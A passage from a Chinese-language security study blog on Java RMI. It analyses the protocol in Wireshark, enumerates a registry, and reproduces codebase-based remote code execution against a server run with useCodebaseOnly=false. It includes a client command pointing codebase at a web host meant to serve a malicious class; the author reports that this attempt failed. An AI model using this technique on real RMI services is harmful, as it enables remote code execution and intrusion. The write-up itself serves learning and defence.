Client</code>就是使用<code>Nameing.lookup()</code>在Registry中寻找到名字是hello的对象，后面的使用就和在本地一样了。</p><p>虽然说执行远程方法的时候代码是在远程远程服务器上执行的，但实际上我们还需要知道有哪些方法，这里接口的重要性就体现出来了，这也是为什么我们前面要继承<code>Remote</code>并将我们需要调用的方法写在<code>IRemoteHelloWorld</code>里，因为客户端也需要用到这个接口。</p><h3 id="3-RMI协议分析"><a href="#3-RMI协议分析" class="headerlink" title="3. RMI协议分析"></a>3. <code>RMI</code>协议分析</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322132848517.png" alt="rmi协议抓包分析"></p><p>这是完整的通信过程，可以发现整个过程进行了两次TCP握手，也就是实际上建立了两次TCP连接。</p><p>第一次建立TCP连接是连接远端<code>127.0.0.1</code>的1099端口，这也是在代码里出现的端口。</p><p>在TCP连接建立完后，发送了一个协议确认，客户端向服务器发送了<em>StreamProtocol</em>用于确认服务器是否支持此协议。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322135411666.png" alt="StreamProtocol"></p><p>再往下就是服务器的确认包，还是上面那个文档，确认包包含了服务器可以看到的客户端的 hostname 及 port。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322140204072.png" alt="Server ACK包"></p><p>之后这个包是客户端向服务器发送编码过的类名，可以看到是序列化过的（0xACED 就是反序列化的标识），可以通过使用<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper 工具</a>来查看内容，总的来说就是获取远程调用对象。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322143402921.png" alt="image-20230322143402921"></p><p>通过Copy as a Hex Stream复制流数据</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322144603262.png" alt="image-20230322144603262"></p><p>丢到SerializationDumper查看内容</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322144507537.png" alt="image-20230322144507537"></p><p>rmi有三个输出消息： <em>Call</em> <em>Ping</em> <em>DgcAck</em></p><p>既然客户端发送了需求类名，那么服务器也会返回一个调用信息，看<code>JRMI</code>，<code>ReturnData</code>包，这其实是一个<code>java.lang.reflect.Proxy</code>对象。这里应该是和注册中心交互的，你给我需求，我给你动态代理。</p><p>通过工具看看包内容，在<code>objectAnnotation</code>中记录了 RMI Server 的地址与端口。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322151526984.png" alt="image-20230322151526984"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322150937897.png" alt="image-20230322150937897"></p><p>拿到 RMI Server 的地址与端口后，Client 就会真正调用远程方法。</p><p>整个过程大致是：</p><p>首先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列列化该对象，发现该对象是⼀一个远程对象，地址在127.0.0.1:52855，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程方法调⽤，也就是hello() 。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322152515902.png" alt="image-20230322152515902"></p><p>RMI Registry就像一个网关，他自己是不会执行远程方法的，但RMI Server可以在上面注册一个Name到对象的绑定关系；RMl Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程方法实际上在RMI Server上调用。</p><p>总结一下，一个RMI过程有以下三个参与者：</p><ul><li>RMI Registry</li><li>RMI Server</li><li>RMI CLient</li></ul><p>在示例代码中为什么只有两个部分呢？原因是，通常在创建一个新的RMI Registry时都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>());<br></code></pre></td></tr></table></figure><p>第一行创建并运行RMl Registry，第二行将RemoteHelloworld对象绑定到Hello这个名字上。</p><p>以上就是RMI整个的原理与流程。接下来，我们很自然地想到，RMI会给我们带来哪些安全问题？</p><p>p神给了两个方向来思考这个问题：</p><ol><li>如果我们能访问RMI Registry服务，如何对其进行攻击？</li><li>如果我们控制了目标RMI服务端中的<code>Naming.lookup</code>的第一个参数(RMI Registry的地址)，能不能进行攻击?</li></ol><h3 id="4-攻击RMI-Registry"><a href="#4-攻击RMI-Registry" class="headerlink" title="4. 攻击RMI Registry"></a>4. 攻击<code>RMI Registry</code></h3><h4 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry"></a>如何攻击<code>RMI Registry</code></h4><p><code>RMI Registry</code>是一个远程对象管理的地方，可以理解为一个远程对象的”后台”。我们可以尝试直接访问”后台”功能，比如修改远程服务器上Hello对应的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>Naming.rebind(<span class="hljs-string">&quot;rmi://10.211.55.18/Hello&quot;</span>, h);<br></code></pre></td></tr></table></figure><p>却报错了</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322161619911.png" alt="image-20230322161619911"></p><p>因为Java对远程访问<code>RMI Registry</code>做了限制，只有来源地址是localhost的时候才能调用<code>rebind</code>、<code>bind</code>、<code>unbind</code>等方法。</p><p>不过<code>list</code>和<code>lookup</code>方法可以远程调用。</p><p><code>list</code>方法可以列出目标所有绑定的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] strings = Naming.list(<span class="hljs-string">&quot;rmi://10.211.55.18/&quot;</span>);<br>System.out.println(Arrays.toString(strings));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230322162835262.png" alt="image-20230322162835262"></p><p><code>lookup</code>作用就是获取某个远程对象。</p><p>那么，只要目标服务器存在一些危险方法，我们通过RMI就可以对其调用。</p><p>但是显然，RMI的攻击面绝对不仅于此。</p><h4 id="codebase简介"><a href="#codebase简介" class="headerlink" title="codebase简介"></a><code>codebase</code>简介</h4><p>涉及到远程加载的场景，一般也会涉及到<code>codebase</code>。</p><p><code>codebase</code>是一个地址，告诉Java虚拟机应该从哪里去搜索类，有点像<code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而codebase通常是远程URL，例如http、ftp等。</p><p>如果我们指定<code>codebase=http://example.com</code>，然后加载<code>org.vulhub.example.Example</code>类，则Java虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就回去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找相对应的类；如果本地没有找到这个类，就回去远程加载codebase中的类。</p><p>如果codebase被控制，那不就可以加载恶意类了吗？</p><h4 id="RMI利用codebase-RCE"><a href="#RMI利用codebase-RCE" class="headerlink" title="RMI利用codebase RCE"></a><code>RMI</code>利用<code>codebase RCE</code></h4><p>在RMI中，可以将codebase随着序列化数据一起传输，服务器在接收到这个数据后就回去CLASSPATH和指定的codebase中寻找类，由于codebase被控制导致RCE。</p><p>不过官方也注意到了这一安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了<code>SecurityManager</code></li><li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code></li></ul><p>​其中<code>java.rmi.server.useCodebaseOnly</code>是在Java 7u21、6u45的时候修改的一个默认配置。</p><ul><li><a href="https://www.oracle.com/java/technologies/javase/7u21-relnotes.html">https://www.oracle.com/java/technologies/javase/7u21-relnotes.html</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></li></ul><p>官方将<code>java.rmi.server.useCodebaseOnly</code>的值由<code>false</code>改为了<code>true</code>。在<code>java.rmi.server.useCodebaseOnly</code>配置为<code>true</code>的情况下，Java虚拟机将只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取。</p><p>通过简单编写以恶搞<code>RMIServe</code>r可以用于复现这个漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param : params) &#123;<br>            sum += param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;setup SecurityManager&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refObj&quot;</span>, h);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// client.policy</span><br>grant &#123;<br>        permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>编译以及运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/.jdks/azul-1.8.0_362/bin/javac *.java<br>~/.jdks/azul-1.8.0_362/bin/java -Djava.rmi.server.hostname=10.211.55.18 -Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.security.policy=client.policy RemoteRMIServer<br></code></pre></td></tr></table></figure><p>其中，<code>java.rmi.server.hostname</code>是服务器的IP地址，远程调用的时候需要根据这个值来访问RMIServer</p><p>然后，再建立一个RMIClinet.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt; &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ICalc</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (ICalc) Naming.lookup(<span class="hljs-string">&quot;rmi://10.211.55.18:1099/refObj&quot;</span>);<br>        List&lt;Integer&gt; li = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个Client需要在另一个位置运行，我们需要让<code>RMI Server</code>在本地<code>CLASSPATH</code>找不到这个类，才会去加载<code>codebase</code>中的类，所以不能将<code>RMIClient.java</code>放在<code>RMI Server</code>所在的目录中。</p><p>运行<code>RMIClient</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.rmi.server.codebase=http://10.211.55.18 RMIClient<br></code></pre></td></tr></table></figure><p>此时会抛出一个异常</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323143628992.png" alt="image-20230323143628992"></p><p>服务器会收到一个来自Java的请求</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323143330502.png" alt="image-20230323143330502"></p><p><em>这里有个有意思的点，<code>RMI Server</code>请求第一次的<code>RMI Registry</code>中不存在这个类，它就直接不会再请求这个服务器了</em></p><p>但事实上和p神的结果不同，他的抛出的异常为一个<code>magic value</code>不正确的错误</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323143749727.png" alt="image-20230323143749727"></p><p>并且请求的url为<code>/RMIClinet$Payload.class</code>。</p><p>我们只需要编译一个恶意类，将其class文件放置在Web服务器的<code>/RMIClient$Payload.class</code>即可。</p><p>对比于我的实验结果，我的似乎不知道去如何寻找这个class，目前还不知道是啥问题。并且当我指定了请求路径后，请求了正确的类，我的服务器给它返回了200，不知道为啥还是找不到类。</p><p>事实上，这次实验是失败了，我还暂时还没找到问题所在。</p><p>推测是Java版本的问题，我目前使用的是</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323144625651.png" alt="image-20230323144625651"></p><h3 id="5-深入理解RMI协议"><a href="#5-深入理解RMI协议" class="headerlink" title="5. 深入理解RMI协议"></a>5. 深入理解<code>RMI</code>协议</h3><p>从原理上讲，<code>codebase</code>究竟是如何传递进而被利用的呢？</p><p>通过追踪TCP流找到Wireshark识别出来的RMI协议的数据包，复制出<code>Java Serialization</code>数据段。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323145726760.png" alt="image-20230323145726760"></p><p>很明显，这段数据由<code>0xACED</code>开头，一看就是一段Java序列化数据</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323145939540.png" alt="image-20230323145939540"></p><p>通过<code>SerializationDumper</code>输出了很多预定义的常量，像<code>TC_BLOCKDATA</code>这种，表示什么意思呢？</p><p>这里借助Java序列化的协议文档：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a></p><p>这段简单的数据其涉及到了如下语法规则：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs haxe">stream:<span class="hljs-type"></span><br>  magic version contents<br><br>contents:<span class="hljs-type"></span><br>  content<br>  contents content<br><br>content:<span class="hljs-type"></span><br>  object<br>  blockdata<br><br>object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<br>  exception<br>  TC_RESET<br><br>blockdata:<span class="hljs-type"></span><br>  blockdatashort<br>  blockdatalong<br><br>blockdatashort:<span class="hljs-type"></span><br>  TC_BLOCKDATA (unsigned byte)&lt;size&gt; (byte)[size]<br><br><span class="hljs-keyword">new</span><span class="hljs-type">String</span>:<br>  TC_STRING <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> (utf)<br>  TC_LONGSTRING <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> (long-utf)<br></code></pre></td></tr></table></figure><p>其中<code>TC_BLOCKDATA</code>这部分对应的是<code>contents -&gt; content -&gt; blockdata -&gt; blockdatashort</code>, <code>TC_STRING</code>这部分对应的是<code>contents -&gt; content -&gt; object -&gt; newString</code>。都可以在文档里找到完整的语法定义。</p><p>这一整个序列化对象，其实描述的就是一个字符串，其值是<code>refObj</code>。意思是获取远程的<code>refObj</code>对象。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs tap">STREAM_MAGIC - 0xac ed<br>STREAM_VERSION - 0x00 05<br>Contents<br>  TC_BLOCKDATA - 0x77<br>    Length -<span class="hljs-number"> 15 </span>- 0x0f<br>    Contents - 0x018ffc446c000001870d3d13018005<br>  TC_OBJECT - 0x73<br>    TC_PROXYCLASSDESC - 0x7d<br>      newHandle 0x00 7e<span class="hljs-number"> 00 </span>00<br>      Interface count -<span class="hljs-number"> 2 </span>- 0x00<span class="hljs-number"> 00 </span>00 02<br>      proxyInterfaceNames<br>        0:<br>          Length -<span class="hljs-number"> 15 </span>- 0x00 0f<br>          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465<br>        1:<br>          Length -<span class="hljs-number"> 5 </span>- 0x00 05<br>          Value - ICalc - 0x4943616c63<br>      classAnnotations<br>        TC_NULL - 0x70<br>        TC_ENDBLOCKDATA - 0x78<br>      superClassDesc<br>        TC_CLASSDESC - 0x72<br>          className<br>            Length -<span class="hljs-number"> 23 </span>- 0x00 17<br>            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879<br>          serialVersionUID - 0xe1<span class="hljs-number"> 27 </span>da<span class="hljs-number"> 20 </span>cc<span class="hljs-number"> 10 </span>43 cb<br>          newHandle 0x00 7e<span class="hljs-number"> 00 </span>01<br>          classDescFlags - 0x02 - SC_SERIALIZABLE<br>          fieldCount -<span class="hljs-number"> 1 </span>- 0x00 01<br>          Fields<br>            0:<br>              Object - L - 0x4c<br>              fieldName<br>                Length -<span class="hljs-number"> 1 </span>- 0x00 01<br>                Value - h - 0x68<br>              className1<br>                TC_STRING - 0x74<br>                  newHandle 0x00 7e<span class="hljs-number"> 00 </span>02<br>                  Length -<span class="hljs-number"> 37 </span>- 0x00 25<br>                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b<br>          classAnnotations<br>            TC_NULL - 0x70<br>            TC_ENDBLOCKDATA - 0x78<br>          superClassDesc<br>            TC_NULL - 0x70<br>    newHandle 0x00 7e<span class="hljs-number"> 00 </span>03<br>    classdata<br>      java.lang.reflect.Proxy<br>        values<br>          h<br>            (object)<br>              TC_OBJECT - 0x73<br>                TC_CLASSDESC - 0x72<br>                  className<br>                    Length -<span class="hljs-number"> 45 </span>- 0x00 2d<br>                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572<br>                  serialVersionUID - 0x00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 02<br>                  newHandle 0x00 7e<span class="hljs-number"> 00 </span>04<br>                  classDescFlags - 0x02 - SC_SERIALIZABLE<br>                  fieldCount -<span class="hljs-number"> 0 </span>- 0x00 00<br>                  classAnnotations<br>                    TC_NULL - 0x70<br>                    TC_ENDBLOCKDATA - 0x78<br>                  superClassDesc<br>                    TC_CLASSDESC - 0x72<br>                      className<br>                        Length -<span class="hljs-number"> 28 </span>- 0x00 1c<br>                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374<br>                      serialVersionUID - 0xd3<span class="hljs-number"> 61 </span>b4<span class="hljs-number"> 91 </span>0c<span class="hljs-number"> 61 </span>33 1e<br>                      newHandle 0x00 7e<span class="hljs-number"> 00 </span>05<br>                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE<br>                      fieldCount -<span class="hljs-number"> 0 </span>- 0x00 00<br>                      classAnnotations<br>                        TC_NULL - 0x70<br>                        TC_ENDBLOCKDATA - 0x78<br>                      superClassDesc<br>                        TC_NULL - 0x70<br>                newHandle 0x00 7e<span class="hljs-number"> 00 </span>06<br>                classdata<br>                  java.rmi.server.RemoteObject<br>                    values<br>                    objectAnnotation<br>                      TC_BLOCKDATA - 0x77<br>                        Length -<span class="hljs-number"> 53 </span>- 0x35<br>                        Contents - 0x000a556e6963617374526566000c31302e3231312e35352e31380000a91f63acfe2ef8f428ab8ffc446c000001870d3d1301800101<br>                      TC_ENDBLOCKDATA - 0x78<br>                  java.rmi.server.RemoteObjectInvocationHandler<br>                    values<br>      &lt;Dynamic Proxy Class&gt;<br></code></pre></td></tr></table></figure><p>这是一个<code>java.lang.reflect.Proxy</code>对象，其中有一段数据储存在<code>objectAnnotation</code>中：这一段中包含了<code>RMI Server</code>的地址和端口，在前文也调试过。</p><p>在拿到<code>RMI Server</code>的地址和端口后，本机就回去连接并正式开始调用方法。</p><p>通过<code>tcp.stream eq 2</code>筛选出本机与<code>RMI Server</code>的数据流</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323155103721.png" alt="image-20230323155103721"> </p><p>可以看到的是，wireshark没有识别出RMI协议。</p><p>图中所选的数据包携带着开头为<code>50 ad ed</code>，50指的是<a href="https://github.com/JetBrains/jdk8u_jdk/blob/master/src/share/classes/sun/rmi/transport/TransportConstants.java#L47"><code>RMI Call</code></a></p><p>使用<code>SerializationDumper</code>查看这段序列化数据：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230323155658304.png" alt="image-20230323155658304"></p><p>可见，<code>codebase</code>是通过<code>[Ljava.rmi.server.ObjID;</code>的<code>classAnnotations</code>传递的。</p><p>所以，即使我们没有RMI客户端，只需要修改<code>classAnnotations</code>的值，就可以控制codebase，使其指向攻击者的恶意网站。</p><h4 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a><code>classAnnotations</code></h4><p>在序列化Java类的时候用到了一个类，叫<code>ObjectOutputStream</code>。这个类内部有一个方法<code>anotateClass</code>, <code>objectOutputStream</code>的子类有需要向序列化后的数据里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p><p>比如，我们RMI的类<code>MarshalOutputStream</code>就将当前的<code>codebase</code>写入</p><ul><li><a 